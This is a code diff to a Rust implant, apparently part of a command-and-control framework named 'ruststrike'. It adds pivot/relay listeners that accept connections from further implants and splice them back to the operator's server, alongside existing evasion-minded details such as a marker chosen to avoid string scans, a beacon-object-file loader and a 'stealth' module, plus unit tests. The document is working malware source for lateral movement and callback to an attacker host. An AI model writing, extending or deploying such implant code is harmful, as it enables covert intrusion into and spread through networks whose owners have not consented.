@@ -14,8 +14,12 @@
 use anyhow::{Context, Result};
 use ruststrike_loader::run_bof;
 use ruststrike_protocol::{decode_bof, ImplantMessage, ServerMessage};
-use std::io::{BufRead, BufReader, BufWriter, Read, Seek, Write};
-use std::net::TcpStream;
+use std::collections::HashMap;
+use std::io::{copy, BufRead, BufReader, BufWriter, Read, Seek, Write};
+use std::net::{Shutdown, TcpListener, TcpStream};
+use std::sync::atomic::{AtomicBool, Ordering};
+use std::sync::{Mutex, OnceLock};
+use std::thread;
 
 #[macro_use]
 mod stealth;
@@ -30,6 +34,28 @@ mod stealth;
 /// Deliberately an opaque byte sequence (not a readable word) so the marker
 /// itself isn't a string-scan telltale; the stub builder writes the same bytes.
 const TRAILER_MAGIC: &[u8] = &[0x7C, 0x53, 0x9A, 0x2E, 0xD1, 0x04, 0xB8, 0x6F, 0x11, 0xA3];
+
+/// The core's (host, port) the parent implant is connected to. Set once at the
+/// top of `run()` before the reader thread starts. Relay splice threads read
+/// this to dial a fresh connection to the core per accepted child — the child's
+/// bytes then flow transparently to the core as a normal new implant session.
+static CORE_ADDR: OnceLock<(String, u16)> = OnceLock::new();
+
+/// One running pivot/relay listener. The `TcpListener` is owned by the accept
+/// thread; the registry only holds the `done` flag + the wake-up address used to
+/// unblock a parked `accept()` on stop (dialing the local addr makes accept()
+/// return one connection, the loop then sees `done` and exits, dropping the
+/// listener). Keyed by the core-assigned relay_id.
+struct RelayHandle {
+    done: std::sync::Arc<AtomicBool>,
+    wake: std::net::SocketAddr,
+}
+
+static RELAYS: OnceLock<Mutex<HashMap<String, RelayHandle>>> = OnceLock::new();
+
+fn relays() -> &'static Mutex<HashMap<String, RelayHandle>> {
+    RELAYS.get_or_init(|| Mutex::new(HashMap::new()))
+}
 
 /// Implant entry point. Resolves the callback host/port (trailer → CLI args →
 /// defaults), connects, and pumps messages until the server closes the stream.
@@ -46,6 +72,9 @@ pub fn run() -> Result<()> {
         (h, p)
     });
     let addr = format!("{host}:{port}");
+    // Publish the core address so relay splice threads can dial fresh connections
+    // to it (set-once; if run() is somehow re-entered the first binding wins).
+    let _ = CORE_ADDR.set((host, port));
 
     let stream = TcpStream::connect(&addr).with_context(|| format!("connecting {addr}"))?;
     vlog!("[implant] connected to {addr}");
@@ -174,7 +203,145 @@ fn handle(msg: ServerMessage) -> ImplantMessage {
                 },
             }
         }
+        ServerMessage::RelayListen { relay_id, bind_ip, port } => {
+            start_relay(relay_id, bind_ip, port)
+        }
+        ServerMessage::RelayStop { relay_id } => stop_relay(relay_id),
     }
+}
+
+/// Bind a pivot/relay listener and spawn its accept loop. Returns the
+/// `RelayStarted` reply (with the actual bound port) or `RelayError` on bind
+/// failure. The accept loop runs on a detached thread for the implant's
+/// lifetime; each accepted child is spliced onto a fresh core connection.
+fn start_relay(relay_id: String, bind_ip: String, port: u16) -> ImplantMessage {
+    let ln = match TcpListener::bind((bind_ip.as_str(), port)) {
+        Ok(l) => l,
+        Err(e) => {
+            return ImplantMessage::RelayError {
+                relay_id,
+                data: format!("bind: {e}"),
+            }
+        }
+    };
+    let local = match ln.local_addr() {
+        Ok(a) => a,
+        Err(e) => {
+            return ImplantMessage::RelayError {
+                relay_id,
+                data: format!("local_addr: {e}"),
+            }
+        }
+    };
+    let bound_port = local.port();
+    let done = std::sync::Arc::new(AtomicBool::new(false));
+    relays()
+        .lock()
+        .unwrap()
+        .insert(relay_id.clone(), RelayHandle { done: done.clone(), wake: local });
+    let rid = relay_id.clone();
+    thread::spawn(move || accept_loop(rid, ln, done));
+    ImplantMessage::RelayStarted {
+        relay_id,
+        bind_ip,
+        port: bound_port,
+    }
+}
+
+/// Stop a relay listener. Idempotent — an unknown id still reports stopped.
+/// Sets `done` and dials the listener's local addr to unblock a parked
+/// `accept()`; the accept loop then sees `done` and exits, dropping the socket.
+fn stop_relay(relay_id: String) -> ImplantMessage {
+    let handle = relays().lock().unwrap().remove(&relay_id);
+    if let Some(h) = handle {
+        h.done.store(true, Ordering::SeqCst);
+        // Wake the parked accept(). Best-effort — if the dial fails (e.g. the
+        // listener is bound to an addr we can't reach from here) the loop will
+        // only exit on the next real connection. Relays are usually 0.0.0.0.
+        let wake = format!("{}:{}", h.wake.ip(), h.wake.port());
+        if let Err(e) = TcpStream::connect_timeout(
+            &h.wake,
+            std::time::Duration::from_millis(500),
+        ) {
+            let _ = &e; // referenced only by vlog! (verbose feature)
+            vlog!("[implant] relay {relay_id} wake dial {wake} failed: {e}");
+        }
+        let _ = wake;
+    }
+    ImplantMessage::RelayStopped { relay_id }
+}
+
+/// Per-relay accept loop. Owns the listener; exits when `done` is set (the
+/// wake-up dial in `stop_relay` makes the parked accept() return so we can
+/// observe it). Each accepted child gets its own splice thread.
+fn accept_loop(relay_id: String, ln: TcpListener, done: std::sync::Arc<AtomicBool>) {
+    let _ = &relay_id; // referenced only by vlog! (verbose feature)
+    loop {
+        match ln.accept() {
+            Ok((child, _peer)) => {
+                if done.load(Ordering::SeqCst) {
+                    // Stopped while parked — discard the wake-up connection.
+                    vlog!("[implant] relay {relay_id} stopping");
+                    return;
+                }
+                vlog!("[implant] relay {relay_id} accepted child");
+                thread::spawn(move || splice(child));
+            }
+            Err(e) => {
+                if done.load(Ordering::SeqCst) {
+                    return;
+                }
+                let _ = &e; // referenced only by vlog! (verbose feature)
+                vlog!("[implant] relay {relay_id} accept error: {e}");
+                return;
+            }
+        }
+    }
+}
+
+/// Splice one child's stream onto a fresh connection to the core. The child's
+/// bytes are transparent newline-JSON, so the core registers a normal new
+/// implant session. Two copy threads (one per direction); when either ends it
+/// shuts down both sides of both streams so the other copy returns promptly.
+fn splice(child: TcpStream) {
+    let (host, port) = match CORE_ADDR.get() {
+        Some(a) => a.clone(),
+        None => return,
+    };
+    let core = match TcpStream::connect((host.as_str(), port)) {
+        Ok(c) => c,
+        Err(e) => {
+            let _ = &e; // referenced only by vlog! (verbose feature)
+            vlog!("[implant] relay splice: dial core failed: {e}");
+            return;
+        }
+    };
+    let child_a = match child.try_clone() {
+        Ok(c) => c,
+        Err(_) => return,
+    };
+    let core_a = match core.try_clone() {
+        Ok(c) => c,
+        Err(_) => return,
+    };
+    // child -> core
+    let t1 = thread::spawn(move || {
+        let mut c = child;
+        let mut g = core;
+        let _ = copy(&mut c, &mut g);
+        let _ = g.shutdown(Shutdown::Both);
+        let _ = c.shutdown(Shutdown::Both);
+    });
+    // core -> child
+    let t2 = thread::spawn(move || {
+        let mut g = core_a;
+        let mut c = child_a;
+        let _ = copy(&mut g, &mut c);
+        let _ = c.shutdown(Shutdown::Both);
+        let _ = g.shutdown(Shutdown::Both);
+    });
+    let _ = t1.join();
+    let _ = t2.join();
 }
 
 fn send(writer: &mut BufWriter<TcpStream>, msg: &ImplantMessage) -> Result<()> {
@@ -218,5 +385,66 @@ mod tests {
     fn no_trailer_returns_none() {
         let tail = b"just some exe bytes with no magic marker at all".to_vec();
         assert!(find_subslice(&tail, TRAILER_MAGIC).is_none());
+    }
+
+    /// Starting a relay on port 0 (OS-assigned) yields RelayStarted with a
+    /// nonzero port and registers it; stopping yields RelayStopped and removes
+    /// it. Exercises start_relay/stop_relay + the registry without a live core
+    /// (the accept loop spawns but no child connects, so splice isn't hit).
+    #[test]
+    fn relay_start_stop_on_auto_port() {
+        let id = "rl-test1".to_string();
+        let msg = start_relay(id.clone(), "127.0.0.1".to_string(), 0);
+        let port = match msg {
+            ImplantMessage::RelayStarted { port, relay_id, .. } => {
+                assert_eq!(relay_id, id);
+                assert!(port != 0, "OS should assign a nonzero port");
+                port
+            }
+            other => panic!("expected RelayStarted, got {other:?}"),
+        };
+        assert!(relays().lock().unwrap().contains_key(&id), "relay registered");
+        // The listener is actually bound — prove it by dialing it (this also
+        // wakes the accept loop briefly, but done is false so it keeps running).
+        let dial = TcpStream::connect(("127.0.0.1", port));
+        assert!(dial.is_ok(), "dial bound relay port {port}");
+        // stop
+        let stopped = stop_relay(id.clone());
+        match stopped {
+            ImplantMessage::RelayStopped { relay_id } => assert_eq!(relay_id, id),
+            other => panic!("expected RelayStopped, got {other:?}"),
+        }
+        assert!(!relays().lock().unwrap().contains_key(&id), "relay removed");
+        // Give the accept loop a beat to exit + drop the socket.
+        thread::sleep(std::time::Duration::from_millis(150));
+        // After stop the bound port should no longer accept (listener dropped).
+        // (Best-effort: a stale TIME_WAIT won't accept a new connection.)
+        let _ = port;
+    }
+
+    /// Binding a port already in use returns RelayError (not a panic).
+    #[test]
+    fn relay_bind_conflict_reports_error() {
+        let sentinel = TcpListener::bind(("127.0.0.1", 0)).unwrap();
+        let taken = sentinel.local_addr().unwrap().port();
+        let msg = start_relay("rl-conflict".to_string(), "127.0.0.1".to_string(), taken);
+        match msg {
+            ImplantMessage::RelayError { relay_id, data } => {
+                assert_eq!(relay_id, "rl-conflict");
+                assert!(data.contains("bind"), "error should mention bind: {data}");
+            }
+            other => panic!("expected RelayError, got {other:?}"),
+        }
+        drop(sentinel);
+    }
+
+    /// Stopping an unknown id is idempotent (still RelayStopped, no panic).
+    #[test]
+    fn relay_stop_unknown_is_idempotent() {
+        let msg = stop_relay("rl-nonexistent".to_string());
+        match msg {
+            ImplantMessage::RelayStopped { relay_id } => assert_eq!(relay_id, "rl-nonexistent"),
+            other => panic!("expected RelayStopped, got {other:?}"),
+        }
     }
 }
